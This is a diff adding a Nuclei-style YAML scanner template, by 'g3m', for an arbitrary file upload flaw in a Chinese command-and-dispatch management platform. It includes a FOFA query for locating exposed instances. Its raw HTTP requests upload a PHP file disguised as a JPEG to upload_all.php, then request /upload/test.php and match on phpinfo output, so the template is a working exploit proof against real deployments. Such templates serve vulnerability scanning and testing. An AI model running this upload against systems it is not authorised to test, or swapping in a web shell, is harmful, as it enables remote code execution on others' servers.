@@ -1,0 +1,63 @@
+id: zhihui-upload-all-file-upload
+
+info:
+  name: 指挥调度管理平台upload_all任意文件上传
+  author: g3m
+  severity: high
+  metadata: 
+    fofa-query: body="指挥调度管理平台"
+
+
+http:
+  - raw:
+    - |
+      @timeout 20s
+      POST /api/yl_client/gps_location/upload_all.php HTTP/1.1
+      Connection: close
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept: application/json, text/plain, */*
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo4PcEwYJ2kc2XBYv
+      Sec-Fetch-Dest: empty
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+      Sec-Fetch-Mode: cors
+      Token: 4EE14A57C12E13071C7CD45F162B0790
+      Cookie: PHPSESSID=reg5ohg0i86279729lt1o0tc76; authcode=qudz
+      Cookie: 
+      Sec-Fetch-Site: cross-site
+
+
+      ------WebKitFormBoundaryo4PcEwYJ2kc2XBYv
+      Content-Disposition: form-data; name="file"; filename="test.php"
+      Content-Type: image/jpeg
+
+      <?php phpinfo();?>
+      ------WebKitFormBoundaryo4PcEwYJ2kc2XBYv--
+
+    - |
+      @timeout 20s
+      GET /upload/test.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Version" 
+          - "PHP Credits"
+          - "PHP Core"
+          - "PHP License"
+        part: body
+        condition: and
+      
+      - type: status
+        status:
+          - 200
+
+
+ 
